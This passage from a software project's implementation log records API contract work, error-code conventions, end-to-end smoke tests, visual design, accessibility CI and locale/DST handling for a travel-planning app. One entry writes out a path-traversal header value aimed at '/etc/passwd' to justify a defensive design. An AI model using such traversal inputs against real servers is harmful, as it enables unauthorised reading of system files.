| --- | --- |
| Invitation redemption + the `invitation_expired` 403 conflict | STEP-004.04 |
| Offline manifest shape against real device constraints | STEP-017 |
| `DATA-013`, `DATA-015` | STEP-006 |

---

## IMPL-026 — STEP-004.02 — Trip, brief and scenario operations (API-001…009)

| Field | Value |
| --- | --- |
| Date | 2026-08-11 |
| Author | Deepesh Kumar Gupta |
| Requirements | REQ-PLAT-005, REQ-PLAT-008 (enforcing REQ-SEC-004, REQ-EVID-001/002/003, REQ-CONS-005/006/011, REQ-PRIV-003) |
| Blast radius | [BR-029](blast-radius/BR-029-trip-scenario-operations.md) (MEDIUM, confidence HIGH) |
| Commit | see git log for this entry |
| Graph indexed commit | `c524820` — matched HEAD at pre-change |

### What was built
Nine operations in `contracts/openapi.yaml` with 15 new schemas, 5 parameters and
a shared infeasibility response. 40 assertions over the contract. Python suite
405 → **440**. Nothing is implemented; that is the point.

### The pre-change check found a contract defect before any code was written
`API_CONTRACTS.md` declared three error codes `ERROR_MODEL.md` does not define:
two transpositions (`coverage.insufficient_evidence` for
`evidence.insufficient_coverage`, `provider.unavailable` for
`coverage.provider_degraded`) and one — `validation.invalid_party` — with **no
entry at all**, against a Validation class §2 has declared since the document was
written.

**None of it would have failed anything.** `API_CONTRACTS.md` is prose and nothing
read it; a client branching on a code the server can never send does not error, it
just never takes that branch. The drift only became visible because `.01` made the
register generated. `TestTheTwoRegistersAgree` now gates it, mutation-tested with
a seeded `provider.made_up`.

Two `validation.*` codes were registered, not a family. A register that
anticipates codes nobody raises rots, because nothing fails when a speculative
entry is wrong.

### Three defects the examples caught in my own contract
This is the argument for contract-first, so it goes in full.

**`PUT /brief` required `If-Match` but not `Idempotency-Key`.** My reasoning was
that a conditional PUT is naturally idempotent. Not good enough: if the first
attempt succeeds and the response is lost, the retry carries a stale `If-Match`
and gets a 409, leaving the client unable to tell whether its change applied.
`If-Match` prevents a lost update; the key prevents a lost **answer**.

**`.01` guessed the remediation shape and `.02` proved it wrong.** It declared
`conflict_set` and `relaxations` as arrays of strings before any operation needed
one. A relaxation must name the constraint it relaxes — "depart at 15:00 instead"
is not actionable unless the reader knows which of three constraints it addresses.
`Problem.remediation` now fixes only `kind`.

**`allOf` with `additionalProperties: false` rejected a field the same schema
requires two lines later.** Each branch validates the whole instance
independently, so a closed branch rejects a property another branch declares. A
schema built for composition cannot be closed; `Party` and `Money` are leaves and
are closed precisely because they are.

### The requirements are enforced by types, not by convention
| Requirement | How |
| --- | --- |
| REQ-EVID-001 | A volatile field's **type** is `Evidenced`, whose provenance members are all required. A bare number cannot be returned |
| REQ-EVID-003 | `status` is required with **no default** — a caller cannot omit it and get `confirmed` for free |
| REQ-EVID-002 | `conflicts[]` retains disagreeing sources. The mean of two departure times is a time no ferry leaves |
| REQ-CONS-005 | The infeasible response **requires** remediation, and a conflict set needs **≥ 2** constraints. A one-item set means the solver failed to explain |
| REQ-CONS-006 | `brief_version`, `evidence_pack_id` and `random_seed` are on the scenario, so a run can be repeated exactly |
| REQ-SEC-004 | Every `{id}` operation reuses the shared denial; **no operation declares a 403** |
| REQ-PRIV-003 | `accessibility_needs` is declared-only, and `Party` is closed so an undeclared sensitive attribute cannot arrive |

### Also worth stating
**`DATA-010` and `DATA-011` do not exist.** The operations reference them and
`DATA_CONTRACTS.md` defines neither — along with 006, 009, 012, 014 and 015. That
is the canonical data model, owned by STEP-006. Noted, not fixed: inventing data
contracts here would put a second author on a document with an owner.

**The 500 ms job-handle promise is declared, not met.** It is a contract
obligation with no implementation to measure. Recorded as such.

**`--repair-fts` does not exist.** `BR-028` recorded the degraded concept search
and quoted the tool's own advice. Running it returns `error: unknown option`, and
`--force` does not rebuild the indexes either. A warning now sits in the
hand-maintained section of `CLAUDE.md`, because the working agreement tells
contributors to use that query *instead of grepping* and it answers "nothing"
rather than failing.

### Follow-ups
| Item | Owner step |
| --- | --- |
| `DATA-006/009/010/011/012/014/015` | STEP-006 |
| Impact-preview token semantics | STEP-014 |
| Collaboration and booking operations | STEP-004.03 |
| Verify the 500 ms job handle against a real handler | STEP-010 / STEP-012 |

---

## IMPL-025 — STEP-004.01 — Global API conventions: errors, pagination, idempotency, ETags

| Field | Value |
| --- | --- |
| Date | 2026-08-11 |
| Author | Deepesh Kumar Gupta |
| Requirements | REQ-PLAT-005 (and REQ-SEC-004, REQ-SEC-001, REQ-PRIV-004 in enforcement) |
| Blast radius | [BR-028](blast-radius/BR-028-api-conventions.md) (MEDIUM, confidence HIGH) |
| Commit | see git log for this entry |
| Graph indexed commit | `f50d854` — matched HEAD at pre-change |

### What was built
`contracts/openapi.yaml` (OpenAPI 3.1, conventions only), `contracts/schemas/`,
and `apps/api/src/conventions/` — problem details, cursor pagination, idempotency
and optimistic concurrency. 70 new assertions; the Python suite goes 335 → 405.

### The register is generated, which is ADR-012 for the second time
`ERROR_MODEL.md` §3 is a table of 21 error codes with, per row, the HTTP status,
the meaning, the remediation and **the requirement the code exists to serve**.
That last column is why the document is the source and the code is the output: an
error code exists to satisfy a requirement, and the traceability belongs where a
product owner reads it, not in a Python literal.

One parser, two emitters — a Python module the API raises from, and a JSON Schema
the contract publishes. 17 of the 21 are client-visible; the rest are internal
conditions that surface as a fallback or a warning and **cannot be returned to a
caller at all**, which the code enforces rather than notes.

**The parser refuses to guess.** It rejected `"500 + **SEV1 alert**"` and made me
resolve it explicitly, with the reason written down: the client gets a plain 500
carrying a correlation ID, because telling a caller their request tripped a
cross-tenant detector confirms the boundary they were probing. A regex grabbing
the first number would have encoded that silently.

### `problem()` takes a code, not strings
The register is the only way in. A free-form constructor produces eighteen
slightly different spellings of "not found" within a year, and clients that branch
on prose.

`safe_detail()` **raises** on a traceback, connection string, credential or email
rather than redacting. Redaction is the friendlier behaviour and the wrong one: it
turns a developer mistake into a silently-truncated message that still ships, and
the next reader assumes the sanitiser covers cases it does not. Same reasoning as
`redaction.py`, which fails closed.

`retryable` is explicit, never inferred from the status — `ERROR_MODEL.md` is
emphatic about it, and the tests pin two 5xx codes with opposite answers.

### The parser silently undid a security decision, and a test caught it
`ERROR_MODEL.md` writes the status of `authz.forbidden` as **"403/404"**, meaning
the two are deliberately indistinguishable. It does not say which is sent. My
parser took the first, so `opaque_denial()` returned **403** — quietly reversing
STEP-002.02, whose entire point is that a 403 still confirms something is there to
be forbidden.

Forced to 404 at the single call site, with the reasoning in the code, so the
register keeps documenting the pair while exactly one is sent. The test asserts
the status, the byte-identical body, the absence of a `detail` field, and the
function's **signature** — adding a `reason` parameter fails the build, because
an optional detail argument is precisely how indistinguishability erodes.

### Cursors are base64, not encryption
So the module never pretends otherwise. A cursor carries a sort key and an
identifier; 14 identity-shaped keys are rejected **on decode as well as encode**.
Encode-side validation protects against our mistakes, decode-side against the
client's, and only one of those is an attacker — a hand-crafted cursor never
passes through `encode_cursor`.

Every malformed cursor raises the identical message, so a caller learns nothing
about why. Offset pagination is absent *structurally*: there is no such parameter
anywhere, so a handler cannot accept one by copying the shape.

### Idempotency and ETags answer different questions
Constantly confused, so the module says so: `Idempotency-Key` asks "is this the
same request I already handled?", `If-Match` asks "is the resource still in the
state you read?". A command needs both — idempotency alone lets a stale editor
clobber a newer version; ETags alone let a network retry create two trips.

Two details worth their comments: header lookup is **case-insensitive**, because
HTTP header names are and a dict is not, and a miss there creates duplicates. And
a **missing** `If-Match` is refused rather than treated as consent, because
treating absence as "no opinion" loses an update on the first request that forgets
the header.

### Two more of my own mistakes
**I searched prose and found the warning.** The test asserting money is not a
float did `"float" not in json.dumps(money)` and matched the schema's own
description explaining why floats are forbidden. Fourth time in this repository.
Now asserts on declared types and `additionalProperties: false`.

**A ratchet fired on a word.** The cross-tenant pending-vector detector reported
that a cache subsystem had landed, because `redis` appears inside a *prohibition*
regex in `problem.py`. It searched raw source text, so it found the warning as
readily as the violation. It now strips comments and string literals and matches
the shape of use — and because narrowing a detector that exists to fail on purpose
is dangerous, a new test proves it still sees real code, still ignores a literal,
and still trips on a seeded `import redis`.

### A third graph limitation, and this one is repairable
`gitnexus_query` returned nothing and warned **"FTS indexes missing — keyword
search degraded"**. The concept search `CLAUDE.md` tells contributors to use
instead of grepping has been quietly degraded for an unknown number of sub-steps.
It did not fail; it returned an empty result, which reads exactly like "no such
concept exists".

Not repaired here — re-indexing with `--repair-fts` mid-change would invalidate
the pre-change state `BR-028` is written against. Carried to STEP-026 with the JSX
and CSS gaps.

The good news alongside it: `impact(opaque_denial)` returned **2 direct callers,
1 execution flow, `epistemic: exact`** — the first genuinely useful graph answer
in this repository. Python functions are called with parentheses, so the call
graph traces them.

### What is NOT met
**`auth/errors.py` still returns the STEP-002.02 body.** It is not RFC 9457, and
migrating it means changing a function with two live callers inside a traced flow
with **no HTTP surface to verify the migration against** — `apps/api` has no
routes yet. Carried to STEP-004.04, where the platform routes land.

Until then **two error shapes exist in the repository**, which is stated in
`BR-028` §7 rather than left to be discovered.

**Rate-limit values.** The mechanism is declared; the numbers need capacity
projections that do not exist (`ASM-002`). Declaring invented limits would be
worse than declaring none.

### Follow-ups
| Item | Owner step |
| --- | --- |
| Migrate `auth/errors.py` to problem details | STEP-004.04 |
| Rate-limit values | After capacity projections (`ASM-002`) |
| `gitnexus analyze --repair-fts` | STEP-026 |
| Generated clients from this contract | STEP-004.07 |

---

## IMPL-024 — STEP-003 closure — End-to-end smoke test and README accuracy

| Field | Value |
| --- | --- |
| Date | 2026-08-11 |
| Author | Deepesh Kumar Gupta |
| Requirements | REQ-PLAT-001 (repository accuracy), REQ-SEC-003, REQ-SEC-006 |
| Blast radius | [BR-027](blast-radius/BR-027-e2e-smoke-and-readme.md) (LOW) |
| Commit | see git log for this entry |

### What was built
`tests/e2e/smoke.sh` (`pnpm e2e`) — 22 checks across seven sections: infrastructure,
schema and row-level security, backend, frontend, the running application over real
HTTP, the accessibility gate, and repository invariants. Plus a README that
describes the repository as it now is.

### Why a separate suite from `pnpm verify`
`verify` proves each layer in isolation and never starts the whole system. This
does, in the order a real request meets it — and it takes about four minutes on
top of verify's three.

**It is deliberately not in `verify`.** A seven-minute gate gets skipped, and a
skipped gate is worse than a slow one. The honest cost is that nothing runs `pnpm
e2e` automatically; it is a command a person must remember, and that gap closes
when there is a pipeline stage that can afford Docker (`STEP-027`). Written down
rather than glossed.

### The first run found four defects — all of them in the test
That is the part worth recording, because a new test suite that reports failures
is only useful if you check which side the fault is on.

| Reported | Actually |
| --- | --- |
| "Redis responds to PING" FAILED | The compose service is `cache`, not `redis`. Redis was fine |
| "PostgreSQL accepts TCP" FAILED | `compose up --wait` returns when the healthcheck passes, but PG18 can still answer *"the database system is in recovery mode"* for several seconds. Same family as BUG-009 |
| "sign-in redirect lacks PKCE S256" FAILED | **The worst of the four.** The suite exported placeholder Auth0 credentials; `process.loadEnvFile` does not overwrite variables already set, so the placeholders beat the real configuration. The suite broke the config and then reported the breakage as a product defect |
| "knowledge graph is current at HEAD" FAILED | The working tree had uncommitted changes, which makes staleness correct rather than wrong |

A fifth appeared on the next run: *"PostgreSQL never became queryable on 5700"*,
reported while the twelve row-level-security assertions in section 2 were passing
against that same database three seconds later. The probe had hard-coded
`-U postgres`; the role is `journeylab`.

Two of these are wrong in the direction of alarm, which erodes trust in a suite
exactly as fast as being wrong in the direction of comfort. All are fixed: real
configuration is used when it exists and the PKCE assertions become a SKIP when
they cannot honestly run; a dirty tree produces a SKIP with the reason; and the
database probe now uses the same credentials the compose file and the isolation
suite use.

**The pattern across all five is one mistake made repeatedly:** I wrote each
probe from my assumption of how the system connects rather than from how the
working code connects. The service name, the database role, the credential
precedence and the readiness semantics were all available to be read, in files I
had already opened. A smoke test that invents its own access path is testing my
memory of the system, not the system.

### Final result
**25 passed, 0 failed, 2 skipped.** Both skips are honest and say why: framing/CSP
headers do not exist until STEP-023, and the knowledge graph is legitimately stale
while the working tree is dirty. Neither is counted as a pass.

### What the suite asserts that nothing else did
Three security properties, end to end against a running production build:

- The session endpoint answers an anonymous caller and **leaks no token** —
  httpOnly cookies stay server-side.
- Sign-in redirects with **PKCE S256 and a `state` parameter**.
- The component gallery is **404 without its flag**, checked against a server
  started without it.

### The same environment lesson, one layer up
`pnpm ci:local` then failed the browser suite: six desktop tests timed out at 30s
while the mobile project passed. Playwright defaults to one worker per two CPUs
and each worker drives a Chromium instance — in the same 4 GB container that had
just exhausted the jsdom workers.

Capped at two workers with a 90s budget **under CI only**. That is a budget for
the environment, not for the product: the Core Web Vitals assertions inside the
suite are untouched and still gate at 2.5s LCP and 200ms interaction, so a slow
runner may take longer to finish but may not report a slow page as acceptable.

**This is the second time in two commits that a default tuned for a developer
machine failed in a constrained container**, and the failure looked like a
different problem each time — a module-resolution error, then a page timeout.
Worth stating as a pattern rather than as two incidents: any default that scales
with CPU count is a memory decision in disguise, and CI is always the machine
with less memory than you assumed.

### The README was substantially untrue
It said *"Pre-implementation — no product code yet"*, *"13 checks"*, and *"the
graph currently indexes documentation only"*. All three had been false for
several sub-steps. It also still listed `BLK-002` and `DEC-004` as open, both
closed.

It now states what exists, the real test counts, the two graph coverage gaps
(JSX untraced, CSS absent), and what remains deliberately unmet with an owner
against each.

### A guard that was wrong
`readme-accuracy.sh` extracted script names with `pnpm [a-z][a-z:]*`, so `pnpm
a11y` was read as `pnpm a` and reported missing. A false failure, and the kind
that gets a guard disabled rather than fixed. The pattern now accepts digits.

### Section 5b exists because of BUG-019
While starting the dev server so the owner could look at the design work, the
gallery returned **500**. It returns 200 from a production build and passes all 40
accessibility assertions there.

**Every automated check in this repository builds for production** — the browser
suite, `pnpm verify`, `pnpm ci:local`, and section 5 of this very suite. `next dev`
renders on a different path with a different tolerance for server-side errors, and
had no coverage whatsoever. The defect survived a whole sub-step and was found by a
person opening a URL.

Section 5b now starts `next dev`, asserts three routes render, and **fails if the
server logged an exception while rendering** — a route that renders while throwing
is half-broken, which is exactly how this looked in production.

### Follow-ups
| Item | Owner step |
| --- | --- |
| Run `pnpm e2e` in a pipeline stage that can afford Docker | STEP-027 |
| Framing/CSP headers — currently a SKIP in the suite | STEP-023 |

---

## IMPL-023 — STEP-003.09 — Visual design language

| Field | Value |
| --- | --- |
| Date | 2026-08-11 |
| Author | Deepesh Kumar Gupta |
| Requirements | REQ-A11Y-004, REQ-NFR-007, REQ-NFR-013 |
| Blast radius | [BR-026](blast-radius/BR-026-visual-design.md) (MEDIUM, confidence HIGH) |
| Commit | see git log for this entry |
| Graph indexed commit | `3793494` — matched HEAD at pre-change |

### Why an unplanned sub-step
STEP-003 had eight sub-steps and none of them was design. `.01` delivered
accessible tokens, `.02`–`.07` behaviour, `.08` the accessibility floor. The
owner reviewed the `.08` screenshots and rejected the result, correctly: it was
legible, operable, standards-clean and looked like an unstyled document, because
in most respects it was one.

Direction was delegated with "use your judgement". This is what that produced.

### The brief I gave myself
JourneyLab shows which futures are feasible and the evidence behind each one. The
interface is a reading surface for decisions someone will act on, sometimes under
pressure, sometimes on a phone in an unfamiliar place. That argues for four
things, and against personality:

- **Hierarchy over decoration** — the eye should find the answer, not the chrome.
- **Colour reserved for meaning** — status and action only. Colour used to look
  nice stops meaning anything when it needs to.
- **Density that stays legible** — five scenarios across seven days is a lot of
  information; whitespace that turns that into scrolling is not generosity.
- **Calm** — a product that says "this plan does not work" should not be jaunty.

### What changed
**Warm neutrals instead of blue-grey.** The old ramp was the default palette of
every developer tool; the content here is places and times of day. The hue moved
and the luminance did not, so no contrast ratio regressed.

**Three border weights.** There had been one, so a hairline between table rows
was drawn at the same weight as the outline of a text input. That single fact is
most of why `.08` looked like a wireframe.

**Status surface tints, each with declared contrast pairs.** A tinted panel reads
faster than a coloured edge alone. Twelve new pairs assert text and edge contrast
on every tint — a tinted panel is the easiest place in a design system to lose
contrast, because the tint is chosen for feel and the text colour is inherited
from somewhere else.

**A radius scale.** Everything had used `--space-1`, so a text input and a
full-screen dialog wore the same 4px corner.

**A system font stack, as a decision rather than a placeholder.** A webfont costs
a request on the critical path and either blocks paint or swaps mid-read; both
damage LCP, which `.08` now gates. It also fails exactly when a traveller most
needs the page. It is one fewer third-party origin in the CSP as well.

Plus optical tracking, a 65ch measure on prose, two-layer shadows, tabular
figures for times and prices, a sticky header, and content centred in 72rem.

### Verification performed
| Check | Result |
| --- | --- |
| `pnpm verify` | **PASS** — 335 Python + 61 web + **307 UI** + **40 browser** |
| `pnpm ci:local` | **PASS** |
| Guard meta-suite | 43/43 |

### The accessibility gate rejected my design three times
This is the part worth keeping, and it is the argument for having built `.08`
before `.09` rather than the other way round.

1. **I shrank checkbox and radio to 20px.** It looks better beside 14px label
   text. SC 2.5.8 requires 24×24, and a checkbox is its own target regardless of
   the 44px row it sits in. Rejected in one run, in both device profiles.
2. **I raised the gallery grid minimum to 22rem** and put 2px of horizontal
   overflow at 320px into the document. A grid item defaults to
   `min-width: auto` and refuses to shrink below its widest unbreakable word; one
   long place name widened a track, the track widened the page. WCAG 1.4.10.
3. **A `margin: -1px` survived from the older `clip: rect()` visually-hidden
   technique**, putting the skip link at `x = -1`. Two more pixels of overflow,
   from a leftover of a technique we do not use.

Each of those looks fine by hand, tests fine in jsdom, and quietly fails a
standard. In any other order they would have shipped.

### A test that failed correctly, and had to be sharpened rather than loosened
The status-token coverage rule requires every `status-*` colour to have an icon
and a label, so nothing can signal by colour alone. It caught the four new
`-surface` tints and demanded icons for them.

A tint is not a signal — the foreground colour, the icon and the label are — so
requiring an icon for `status-success-surface` asks for something meaningless.
The rule now excludes the `-surface` suffix. **The easy fix would have been to
ignore anything unmatched, which would have made the whole test vacuous**, so a
second test asserts that a hypothetical new signal colour is still caught while a
hypothetical new tint is not.

### And one flaw in the gate itself
The INP check measured a single interaction. It reported 422 ms once on a machine
that was also building, and 7 ms when idle. That is a flaky gate, and `BUG-016`
already established a flaky gate is worse than a failing one: it teaches people
that re-running is the fix. It now takes the median of five interactions, which
is stable against a scheduling hiccup and still fails outright for a handler that
genuinely blocks the main thread.

### The CI mirror rejected the commit twice, for a reason that was not the code
`pnpm ci:local` failed with 7 of 8 UI suites unable to collect:

```
[vitest-worker]: Timeout calling "fetch" with "[".../tokens.test.ts","web"]"
```

That names a module path, so I chased a dependency problem — first a
`vite-node`/`vitest` version mismatch in the lockfile, then an incomplete cold
install. **Neither existed.** I believed the error's implied cause twice before
capturing the full log and reading it properly.

The actual cause: Docker allocates the container 4 GB, vitest defaults to one
worker per CPU, and every worker in this package builds its own jsdom and loads
axe-core into it. Eight jsdoms exhaust the container, the main thread stops
answering transform requests, and the workers time out.

Capped at two workers under `CI` only, with a longer transform timeout. That is
a fix rather than a workaround: a suite that needs several free gigabytes is
fragile on any shared runner. Verified by running the capped path locally with
`CI=true` — 307 pass either way.

### What is NOT met
**Iconography.** `STATUS_TOKENS` names an icon per status — `check-circle`,
`alert-triangle` — and nothing renders them. The non-colour signal is currently
carried by the text label and the panel edge, which satisfies REQ-A11Y-004, but
the tokens describe a system that does not exist yet.

**A logo, illustration, and marketing surfaces.** Out of scope and unscheduled.

**Any of this validated with a user.** It is one implementer's judgement against
a written brief. It is defensible, not proven.

### Follow-ups
| Item | Owner step |
| --- | --- |
| Icon set to make `STATUS_TOKENS` real | STEP-013, with the first visualisation |
| Design review with someone who is not the implementer | Before GA |
| Chart and map palettes (categorical, colour-blind safe) | STEP-013 |

---

## IMPL-022 — STEP-003.08 — Automated keyboard and axe checks in CI

| Field | Value |
| --- | --- |
| Date | 2026-08-10 |
| Author | Deepesh Kumar Gupta |
| Requirements | REQ-A11Y-001 (and REQ-A11Y-004, REQ-NFR-013 in passing) |
| Blast radius | [BR-025](blast-radius/BR-025-accessibility-ci.md) (MEDIUM, confidence HIGH) |
| Commit | see git log for this entry |
| Graph indexed commit | `1d67ffc` — matched HEAD at pre-change |

### What was built
Playwright with `@axe-core/playwright`, running against a **production** build in
two profiles (Desktop Chrome, Pixel 7): 20 tests × 2 = 40. A gated component
gallery at `/dev/gallery` as the surface to walk. `packages/ui/src/components.css`.
A runtime accessibility counter. `tests/guards/gallery-gate.sh`.
`ACCESSIBILITY_AUTOMATION_LIMITS.md`. All of it inside `pnpm verify`, so it runs
locally exactly as it runs in CI.

### The headline: a browser found seven defects that 256 jsdom tests could not

This is the whole argument for the sub-step, so it goes first.

| # | Defect |
| --- | --- |
| 1 | **Checkboxes and radios rendered 13×13.** Text inputs 21px tall, selects 19px, table sort buttons 21px. Every one below the 24×24 WCAG 2.2 SC 2.5.8 requires |
| 2 | **28 of the design system's 40 class names had no CSS whatsoever.** Only the shell, nav and skip link were styled. Everything else was browser defaults |
| 3 | **A `color-contrast` failure on the home page** — `#888` on white is 3.5:1 |
| 4 | **32px of horizontal overflow at a 320px viewport** — WCAG 1.4.10 Reflow |
| 5 | **`forced-colors` was overridden with our palette**, and axe measured the result at 1.07:1 |
| 6 | **Valid and disabled fields wore the error styling** |
| 7 | **The gallery's own CSS outranked `.jl-nav__link`** and shrank nav targets from 44px to 24px |

jsdom has no layout engine. It will state, correctly and uselessly, that a
checkbox exists, is labelled, is reachable by keyboard — and is 0×0. Every
geometric assertion made in seven previous sub-steps was vacuous, and none of
them could have known.

Defect 7 is the most instructive: it was **introduced by me, four minutes
earlier**, in the fix for defect 2, and caught on the next run. A gallery must
never restyle its specimens or it measures itself.

### The forced-colors mistake was conceptual, not a typo
`tokens.css` had one media query for `prefers-contrast: more` **and**
`forced-colors: active`. They are different signals:

- `prefers-contrast: more` says *"I want more contrast"*. Our AAA palette is the
  right answer.
- `forced-colors: active` says *"I have chosen my own palette"*. It is not ours
  to override — Windows High Contrast ships light themes as well as dark ones —
  and the override does not even work: the user agent replaces `background-color`
  regardless while authored text colour may survive, so black-and-yellow became
  yellow on whatever canvas the system picked.

The forced-colors branch now maps every token onto a CSS system colour. Status
tokens all resolve to `CanvasText`, which is fine precisely because
`REQ-A11Y-004` already required a non-colour signal for every status.

### Why there is a gallery, and why it is gated by an explicit flag
"axe over every component story" needs stories, and there is no Storybook. The
gallery is one route rendering every primitive in every quality state.

`NODE_ENV !== 'production'` would be the obvious gate and is wrong here: the
accessibility run must walk a **production** build, because that is the build
whose Core Web Vitals and hydration behaviour are worth measuring. So the gate is
`JOURNEYLAB_ENABLE_GALLERY === '1'`, default off — exact match, because
`'false'` and `'0'` are both truthy strings and both mean off.

`notFound()`, not a 403: a 403 confirms the path exists.

The gate is verified by `tests/guards/gallery-gate.sh`, which boots a production
server **without** the flag and asserts 404. It is deliberately not a Playwright
test — the harness sets the flag in order to do its job, so it can only ever
prove the positive case.

### What the runtime counter is, and is not
Not axe in production: walking the accessibility tree on a traveller's phone
would cost more than the page, and a violation found on the device is already in
front of the user.

It counts the failures that only exist in a real session — chiefly **focus
falling to `<body>` after a client navigation**, which axe cannot see because it
is a property of a transition, not of a page. For a sighted user nothing
happens; for a keyboard user the next Tab starts from the top of the document.

The event is `{signal, surface}` and nothing else. An accessible name can contain
a traveller's name or destination, so element text is never reported — a test
asserts the event has exactly those two keys, so a field cannot be added quietly.

### Verification performed
| Check | Result |
| --- | --- |
| `pnpm verify` (guards + lint + typecheck + Python + tests + build + gate + browser) | **PASS** |
| `pnpm ci:local` (Linux, clean checkout, cold install, `CI=true`) | **PASS** — after rejecting three commits first; see the regression entry |
| Playwright | **40 passed** (20 × desktop and Pixel 7) |
| UI / web / Python | 267 / 61 / 335 passed |
| Guard meta-suite | **43/43** |

**Mutation testing.** The gallery gate forced open ⇒ guard fails. `ignoreBuildErrors`
reverted ⇒ build fails. A seeded `image-alt` violation ⇒ axe run fails — that one
is a permanent test, not a one-off mutation, because §7 asks for it explicitly.

### Six carried criteria closed
| From | Criterion |
| --- | --- |
| STEP-003.01 | forced-colors rendering |
| STEP-003.04 | real-browser verification of table and list |
| STEP-003.05 | skip-link visible on focus; Core Web Vitals |
| STEP-003.06 | touch-target size; the 48rem breakpoint |
| STEP-003.07 | RTL layout in something that lays out |
| STEP-002.05 | auth-flow page accessibility — the contrast failure was on that page |

### What is NOT met, and is documented rather than glossed
`ACCESSIBILITY_AUTOMATION_LIMITS.md` exists because §5 asks for it, and because
the honest number is that automation finds **a third to a half** of real
accessibility defects.

Not covered, and not coverable: whether an announcement makes sense; screen-reader
behaviour across the five required AT/browser combinations; whether focus *order*
is logical as opposed to unstuck; cognitive load and error recovery; meaning
carried by hue within a chart; voice control, switch access and magnifiers.

**Core Web Vitals are lab numbers.** §7's budgets specify mid-tier mobile on 4G;
this runs on a CI machine over loopback. It catches regressions. It cannot confirm
the budget for a traveller on a ferry — that needs real-user monitoring at
STEP-024, and is recorded as unmet rather than counted.

### Surprises
**A stale server made me believe I had broken every stylesheet.** A screenshot came
back completely unstyled; the CSS chunk was 500ing. The cause was an orphaned
`next start` from a previous run still bound to 5708, serving the previous build's
HTML with a chunk hash that no longer existed. The guard now refuses to run if the
port is occupied rather than measuring the wrong server.

**`pnpm typecheck` caught what `pnpm --filter @journeylab/ui typecheck` could not.**
The BUG-018 fix needed `allowImportingTsExtensions` in a *second* package, because
`apps/web` typechecks `packages/ui/src/tokens.ts` through the workspace import.
Only the full per-package run said so.

**A guard reported PASS while its cleanup did nothing.** `gallery-gate.sh` used
`lsof`, which node:24-bookworm does not ship. On Linux the trap failed silently,
the guard still printed PASS, and the accessibility run that follows it died on
an occupied port. A cleanup that depends on a tool which may be absent is a
cleanup that fails on the machine you were not testing on — so liveness is now
decided by asking the server with curl, and the guard escalates until the port
is genuinely free rather than assuming it is.

**The meta-test stopped testing anything, on Linux only.** The seeded `image-alt`
violation is prepended to `<body>`, which React owns; there, hydration finished
after the injection and discarded it. The one test whose job is to prove the gate
can fail was quietly proving nothing. It now waits for hydration and asserts the
seed is still in the DOM before axe runs.

**The graph reports zero dependents for every React component.** See BR-025 §3:
`CALLS` edges come from function calls, and a component used only as JSX is never
called. `impact(SkipLink)` returns 0 against eight real references.

### Follow-ups
| Item | Owner step |
| --- | --- |
| Manual screen-reader journeys across the five AT/browser pairs | Every release |
| Real-user CWV monitoring to replace the lab numbers | STEP-024 |
| Component impact analysis is unreliable (JSX not traced) | STEP-026 |
| A visual design pass — `components.css` is accessibility styling, not design | Design, unscheduled |
| Voice control, switch access, 200%/400% zoom | Before GA |

---

## IMPL-021 — STEP-003.07 — Locale, time zone, currency and DST handling

| Field | Value |
| --- | --- |
| Date | 2026-08-10 |
| Author | Deepesh Kumar Gupta |
| Requirements | REQ-NFR-007, REQ-NFR-008 (and REQ-SEC-006 on the negotiation path) |
| Blast radius | [BR-024](blast-radius/BR-024-i18n-locale-timezone-money.md) (MEDIUM, confidence HIGH) |
| Commit | see git log for this entry |
| Graph indexed commit | `bb943f9` — matched HEAD at pre-change |

### What was built
`packages/ui/src/i18n/` — `money.ts`, `datetime.ts`, `messages.ts`; `apps/web/src/lib/i18n.ts` and `messages/en.ts`; `tests/guards/logical-css.sh`. The root layout now negotiates a locale per request. 36 new tests (256 UI, 61 web).

### DST is a feasibility concern, not a formatting one
The sub-step record said it before the work started, and it shaped everything: *"an itinerary crossing a transition computes wrong travel windows, which STEP-012 will then present as a valid plan."*

A formatting bug shows a wrong string. A DST bug ships a wrong plan — and it ships it looking correct, because the solver will already have declared it feasible.

The night of 2026-03-29 in Europe/London is **23 hours long**. A journey from 22:00 the previous evening to 06:00 the next morning is eight hours on a wall clock and **seven in reality**. A 90-minute connection inside that window is a 30-minute one. `hoursInDay` returns 23, 24 or 25 rather than assuming; `elapsedHours` subtracts instants, which cannot be fooled by a clock that jumped. Both are tested against Europe/London **and** Australia/Sydney, where the transitions are reversed — a suite that only checks Europe encodes a northern-hemisphere assumption it never states.

### Two carried questions, resolved — and they were the same question
`STEP-003.02` left "the ICU message loading strategy interacts with server components" open, and §4 of this sub-step asked whether formatting runs server-side, client-side or both. Both are the hydration problem.

**The decision: every formatter takes `locale` and `timeZone` as required arguments and reads nothing ambient.** The usual mismatch is a server rendering in UTC and a browser re-rendering in its own zone; React reports it, and a user sees the time flicker to a different value. Passing both explicitly makes the two outputs identical by construction.

**The zone comes from the trip, not the reader.** A traveller checking their Tokyo itinerary from London wants Tokyo times. "The ferry leaves at 23:40 yesterday" is true and useless.

**Catalogues are plain data, resolved synchronously, passed in as values.** An async load inside a component makes every component that renders text a suspense boundary. A module-level "current locale" is shared mutable state on a server handling concurrent requests, and the failure mode is one user seeing another user's language — the same hazard `auth/context.py` designed out at STEP-002.02.

### `Accept-Language` is untrusted input
The naive locale loader is `import('./messages/' + locale)`. With `Accept-Language: ../../../../etc/passwd` that is a path traversal. The header is therefore only ever used to **select** from a statically-imported map, and never concatenated into anything; a miss is `undefined`, not a filesystem read. It is length-capped at 512 bytes before parsing, because a 2 MB header with fifty thousand q-weighted tags is a cheap way to spend server CPU on every request.

### Money is an integer count of minor units
`0.1 + 0.2 !== 0.3`, and currency arithmetic is mostly addition. Thirty ten-cent items summed as floats do not equal three euros. The representation is `{ amountMinor, currency }`; only formatting divides. **The exponent is not always 2** — JPY and KRW have none, BHD/KWD/TND have three, and hard-coding `/ 100` shows a Japanese price one hundred times too small.

### Verification performed
| Check | Result |
| --- | --- |
| `pnpm verify` (16 guards + lint + typecheck + Python + tests + **build**) | **PASS** — 335 Python + 61 web + 256 UI |
| `pnpm ci:local` (Linux, clean checkout, cold install, `CI=true`) | **PASS** — and it rejected my first BUG-017 fix before it was pushed |
| Host-zone independence | **PASS** under UTC, Pacific/Auckland, America/Los_Angeles, Asia/Kolkata, Europe/London |
| Guard meta-suite | 40/40 |

**Mutation testing — 26 killed, 2 recorded as equivalent, 3 vacuous tests found and fixed.**

| Module | Result |
| --- | --- |
| `datetime.ts` | 6/6 killed — including dropping the second DST correction pass and ignoring the zone entirely |
| `money.ts` | 6 killed, **1 equivalent** (see below) |
